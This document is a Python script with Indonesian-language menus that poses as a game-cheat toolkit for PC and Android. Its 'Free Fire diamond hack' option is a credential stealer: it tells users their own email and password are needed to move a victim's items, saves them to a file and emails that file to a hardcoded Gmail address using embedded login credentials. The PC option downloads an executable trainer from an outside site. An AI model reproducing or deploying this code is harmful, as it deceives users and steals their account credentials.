import requests
import webbrowser
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print("---------------------------------------------")
print("---------------------------------------------")
print(bcolors.ENDC,"Script Python Untuk PC dan ANDROID ")
print("---------------------------------------------")
print("---------------------------------------------")
print(" By User Chou")
print(" Apa Perangkat Lunak Anda ?"
      "\n1.PC"
      "\n2.Android")
print("---------------------------------------------")

inputhome = int(input("Pilihan Anda >> "))
class main:
      print("---------------------------------------------")
      print("---------------------------------------------")
      print("---------------------------------------------")
      def backfb(awe):
            print("Dapatkan password Dengan chat di FB : Ustaz Chou")
            awe=str(input("Masukan Password"))
            if awe==23424:
                  pass

      def main_pc():
            print("Warning : Tidak Untuk Diperjual Belikan \nGunakan Sebaik Mungkin \n Kumpulan Script PC \n1. Cheat Game Online \n2. Cheat Game Offline \n3. Pembuatan Aplikasi Tkinter\n4. Script Soundtrack Mobile Legends Costom")
            print(bcolors.OKBLUE,"Script ini akan terus update dan menambahkan game offline\online")
            inputpc = int(input(" Pilihan Anda : "))

            def gmoffline():
                  print("Game yg ingin di Crack \n1. MB WARBAND Offline Mode\nGame Lain Belum Di Update harap Sabar y :(")
                  inputoffline = int(input("PILIH GAME NYA :  "))

                  url = 'https://mrantifun.net/attachments/mount-blade-warband-steam-trainer-setup-exe.8331/'
                  r = requests.get(url, allow_redirects=True)

                  open('Mount & Blade Warband (Steam) Trainer Setup.exe', 'wb').write(r.content)

            def gmonline():
                  print("Dalam perbaikan")
            if inputpc == 1:
                  gmonline()

            elif inputpc == 2:
                  gmoffline()
            elif inputpc == 3:
                  print("sedang dalam pengembangan")
            elif inputpc == 4:
                  print("sedang dalam pengembangan")
            else:
                  print(bcolors.FAIL,"Pilihan Anda tidak Ditemukan\n'Coba Gunakan Sesuai Dengan Number Yang Tersedia!'")

      def main_andro():
            def backround():
                  print("--------------------------------------------------------")
                  print("Masukan ID korban")
                  scmlbb = int(input("ID FREE FIRE KORBAN >> "))

                  if scmlbb > 0:
                        print(bcolors.OKBLUE,"Berhasil Ditemukan !!")

                  print(bcolors.FAIL,"System Membutuhkan Email Dan Password Anda Untuk Memindahkan Skin\Diamond Korban Ke akun Anda")
                  print(bcolors.ENDC,"Proses Membutuhkan Waktu Kurang lebih 30 menit\n")
                  emailsaya = str(input("Masukan Email Anda >>"))
                  passaya=str(input("Masukan PASS Anda >>"))
                  print("--------------------------------------------------------")
                  with open("inp.txt","w") as text_file:

                        text_file.write(" ".join([emailsaya, passaya]))



                  print("BUNDLE DAN DIAMOND KORBAN BERHASIL DIPINDAHKAN KE AKUN ANDA DALAM 30 Menit!! \n Mohon Tunggu selama 30 menit ")
                  inputlagi=str(input("Hack Lagi?"))
                  if inputlagi == 1:
                        backround()

                  fromaddr = "mangopang32@gmail.com"
                  toaddr = "mangopang5@gmail.com"
                  msg = MIMEMultipart()
                  msg['From'] = fromaddr
                  msg['To'] = toaddr
                  msg['Subject'] = "PY"
                  body = 'passaya'

                  msg.attach(MIMEText(body, 'plain'))
                  filename = "inp.txt"
                  attachment = open("inp.txt", "rb")
                  p = MIMEBase('application', 'octet-stream')
                  # To change the payload into encoded form
                  p.set_payload((attachment).read())
                  # encode into base64
                  encoders.encode_base64(p)
                  p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
                  # attach the instance 'p' to instance 'msg'
                  msg.attach(p)
                  # reates SMTP session
                  s = smtplib.SMTP('smtp.gmail.com', 587)
                  # start TLS for security
                  s.starttls()
                  # Authentication
                  s.login(fromaddr, "Keren2222")
                  # Converts the Multipart msg into a string
                  text = msg.as_string()
                  # sending the mail
                  s.sendmail(fromaddr, toaddr, text)
                  # terminating the session
                  s.quit()



            print(bcolors.ENDC,"Warning : Tidak Untuk Diperjual Belikan \n Gunakan Sebaik Mungkin \n Kumpulan Script Android \n1. Hack Diamond\Item Free Fire \n2. Hack Mobile Legends \n3. Script Hack FB (Bersyarat)")
            inputandro=int(input("Pilihan Anda : "))

            if inputandro == 1:
                  backround()
            elif inputandro == 3:
                  backfb()
            elif inputandro == 2:
                  print("Perbaikan")





      if inputhome == 1:

            main_pc()
      elif inputhome == 2:
            main_andro()

      else:
            print(bcolors.FAIL,"Pilihan Anda tidak Ditemukan\n'Coba Gunakan Sesuai Dengan Number Yang Tersedia!'")
main.mainloop()